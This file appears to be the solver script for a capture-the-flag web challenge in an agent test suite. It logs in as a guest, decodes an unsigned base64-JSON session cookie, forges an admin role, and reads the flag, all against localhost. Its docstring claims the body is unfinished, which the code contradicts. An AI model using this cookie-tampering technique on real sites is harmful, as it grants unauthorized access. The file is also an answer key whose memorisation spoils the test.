"""solver_template.py — kca-fixtures-2026/web-1-cookie-monster.

Skeleton for the M11-T005 solver loop. The agent (or a human running the
fixture out-of-band) fills in the body; this file ships pre-wired imports,
a target-URL constant pinned to localhost, and the SHA-256 verification
stub that confirms a recovered string matches ./expected.sha256.

License: MIT.

Usage (T005):
    1. docker-compose up -d   # FLAG env var must be set
    2. python solver_template.py
    3. The script exits 0 iff sha256(recovered_flag) matches the digest
       in ./expected.sha256.

The solver MUST only hit http://localhost:18080. Do NOT add any other
target host.
"""

from __future__ import annotations

import base64
import hashlib
import json
import sys
from pathlib import Path

try:
    import httpx
except ImportError:  # pragma: no cover
    print("solver requires httpx: pip install httpx", file=sys.stderr)
    raise

TARGET = "http://localhost:18080"
HERE = Path(__file__).parent
EXPECTED = HERE / "expected.sha256"


def _expected_digest() -> str:
    """Read the digest from expected.sha256 (format: '<hex>  flag\n')."""
    line = EXPECTED.read_text(encoding="utf-8").strip().splitlines()[0]
    return line.split()[0]


def _verify(recovered: str) -> bool:
    return hashlib.sha256(recovered.encode("utf-8")).hexdigest() == _expected_digest()


# ---------------------------------------------------------------------------
# T005 fills in the body of `solve` below.
# ---------------------------------------------------------------------------


def solve() -> str:
    """Return the recovered flag string. T005 implementation goal.

    Suggested approach (the intended-solution path, see ../description.md):
      1. POST /login with username=guest. Capture the `session` cookie.
      2. Decode the cookie (urlsafe-base64 of a JSON object).
      3. Flip {"role": "user"} → {"role": "admin"} and re-encode.
      4. GET /admin with the tampered cookie. Parse the flag out of the
         response body.

    The skeleton below stops at step 1; T005 wires the remainder.
    """
    import re

    client = httpx.Client(base_url=TARGET, timeout=5.0)
    try:
        # Step 1: log in as a non-admin to receive a session cookie.
        r = client.post("/login", data={"username": "guest"}, follow_redirects=False)
        if r.status_code not in (301, 302, 303):
            raise RuntimeError(f"unexpected /login status: {r.status_code}")
        cookie = r.cookies.get("session")
        if not cookie:
            raise RuntimeError("no session cookie issued")

        # Step 2: decode the base64-JSON envelope (no signature).
        payload = _decode_b64_json(cookie)
        if not isinstance(payload, dict):
            raise RuntimeError("session cookie did not decode to a JSON object")

        # Step 3: flip role to admin and re-encode.
        payload["role"] = "admin"
        tampered = _encode_b64_json(payload)

        # Step 4: GET /admin with the tampered cookie and parse the flag.
        # The client jar already holds the guest cookie from /login. httpx
        # will append a second `session` cookie (yielding a CookieConflict
        # on read or an unpredictable Cookie: header merge) if we just call
        # cookies.set — clear the jar entry first.
        try:
            client.cookies.delete("session")
        except Exception:
            client.cookies.clear()
        client.cookies.set("session", tampered)
        r2 = client.get("/admin")
        if r2.status_code != 200:
            raise RuntimeError(f"unexpected /admin status: {r2.status_code} body={r2.text[:64]!r}")
        # The app returns "<pre>FLAG: kca{...}</pre>".
        m = re.search(r"FLAG:\s*(\S+?)\s*</pre>", r2.text)
        if not m:
            raise RuntimeError("flag marker not found in /admin response")
        return m.group(1)
    finally:
        client.close()


def _decode_b64_json(token: str) -> dict:
    pad = "=" * (-len(token) % 4)
    raw = base64.urlsafe_b64decode((token + pad).encode("ascii"))
    return json.loads(raw.decode("utf-8"))


def _encode_b64_json(payload: dict) -> str:
    raw = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def main() -> int:
    try:
        flag = solve()
    except NotImplementedError as exc:
        print(f"solver template not yet completed: {exc}", file=sys.stderr)
        return 2
    except Exception as exc:  # noqa: BLE001
        print(f"solver error: {type(exc).__name__}: {exc}", file=sys.stderr)
        return 1
    if not _verify(flag):
        # Never echo the flag value, even on mismatch — log length only.
        print(f"flag verify FAIL (flag_length={len(flag)})", file=sys.stderr)
        return 1
    print("flag verify PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
